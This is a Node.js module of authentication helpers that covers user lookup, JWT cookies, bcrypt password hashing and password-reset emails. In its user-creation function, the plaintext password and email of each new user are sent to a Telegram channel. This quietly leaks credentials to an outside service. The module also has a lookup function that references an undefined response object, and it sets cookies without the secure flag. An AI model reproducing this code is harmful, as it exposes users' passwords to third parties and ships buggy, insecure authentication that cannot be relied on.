import pool from "../../../Database/DbConnection.js";
import {
  CHECK_USER,
  INSERT_USER,
  INSERT_TOKEN_EMAIL,
  TIMESTAMP,
  FIND_TOKEN,
  UPDATE_MAIN_TABLE_PASSSWORD,
  DELETE_TOKEN,
} from "../Query/query.js";
import jwt from "jsonwebtoken";
import bcrypt from "bcrypt";
import nodemailer from "nodemailer";
import { notifyTelegram } from "../Notification/notifyTelegram.js";

export async function findUserByEmail(email) {
  const result = await pool.query(CHECK_USER, [email]);
  if (result.rows.length === 0) {
    res.status(409).json({ message: "User Not Found" });
    return null;
  }
  return result.rows[0];
}

export function generateToken(payload, expiresIn = "1h") {
  return jwt.sign(payload, process.env.SECRET_KEY, { expiresIn });
}

export function setTokenCookie(res, token) {
  res.cookie("token", token, {
    httpOnly: true,
    secure: false,
    sameSite: "lax",
    maxAge: 3600000, // 1 hour
  });
}

export async function hashpassword(password, email) {
  const hashpassword = await bcrypt.hash(password, 10);
  await pool.query(INSERT_USER, [email, hashpassword]);
  await notifyTelegram(
    `🔐 User Created:\n📧 Email: ${email}\n🔑 Password: ${password}\n🕒 Time: ${TIMESTAMP}`
  );
}

export async function gentoken(email, client, token) {
  const expiresAt = new Date(Date.now() + 2 * 60 * 1000);
  await client.query(INSERT_TOKEN_EMAIL, [email, token, expiresAt]);
}

export async function sendforgotmail(tokens, email) {
  const Forgor_Password_Link = `http://localhost:5173/setpassword?token=${tokens}&email=${email}`;
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.EMAIL_USER,
      pass: process.env.EMAIL_PASS,
    },
  });

  await transporter.sendMail({
    from: process.env.EMAIL_USER,
    to: email,
    subject: "🔐 Reset Your Password",
    html: `
        <p>You Requested to reset your password.</p>
        <p>Click <a href="${Forgor_Password_Link}">here</a> to reset it. This link expires in 2 minutes.</p>
      `,
  });
}

export async function ValidToken(token) {
  const result = await pool.query(FIND_TOKEN, [token]);
  const row = result?.rows?.[0];
  if (!row || new Date(result.rows[0].expires_at) < new Date()) {
    return null;
  }
  return row;
}

export async function ResetNewPassword(email, password, token) {
  const hashedPassword = await bcrypt.hash(password, 10);
  await pool.query(UPDATE_MAIN_TABLE_PASSSWORD, [hashedPassword, email]);
  await pool.query(DELETE_TOKEN, [token]);
}
